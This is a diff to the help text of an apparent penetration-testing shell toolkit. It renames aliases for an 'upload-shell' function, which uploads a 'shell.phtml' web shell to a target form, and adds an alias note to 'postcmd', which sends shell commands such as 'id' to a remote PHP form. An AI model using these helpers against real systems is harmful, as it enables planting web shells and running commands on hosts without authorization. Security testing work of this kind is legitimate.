@@ -47,7 +47,7 @@ upload-shell() {
         echo "  POST multipart upload of shell.phtml (default: $SHELL_UPLOAD_FILE)"
         echo ""
         echo "options:"
-        echo "  <exec_id>              load form from ev/exec (e.g. upsh 63)"
+        echo "  <exec_id>              load form from exec-view (e.g. upload-shell 63)"
         echo "  @<exec_id>             same as above"
         echo "  -f, --field <name>     form field for file (overrides exec-form)"
         echo "  -n, --name <filename>  filename sent to server"
@@ -55,10 +55,12 @@ upload-shell() {
         echo "  -F <key=value>         extra form field (overrides exec-form extras)"
         echo "  -v, --verbose          curl -v"
         echo ""
+        echo "  alias: upsh"
+        echo ""
         echo "examples:"
-        echo "  x curl -sS http://\$IP/panel/     # then:"
-        echo "  upsh 63                            # form fields from exec HTML"
-        echo "  upsh -f fileUpload -F submit=Upload http://\$IP/panel/"
+        echo "  exec-run curl -sS http://\$IP/panel/     # then:"
+        echo "  upload-shell 63                            # form fields from exec HTML"
+        echo "  upload-shell -f fileUpload -F submit=Upload http://\$IP/panel/"
         echo ""
         echo "  exec-form 63                       # preview parsed fields"
         return 0
@@ -169,6 +171,7 @@ postcmd() {
     case "$1" in
       -h|--help)
         echo "usage: postcmd -u url [-f field] [-F key=val] [-k] [command...]"
+        echo "  alias: pcmd"
         echo "  url:  -u or POSTCMD_URL (required unless POSTCMD_URL is set)"
         echo "  field: POST field for shell cmd (default: cmd, or POSTCMD_FIELD)"
         echo "  example: postcmd -u http://\$IP/form.php id"
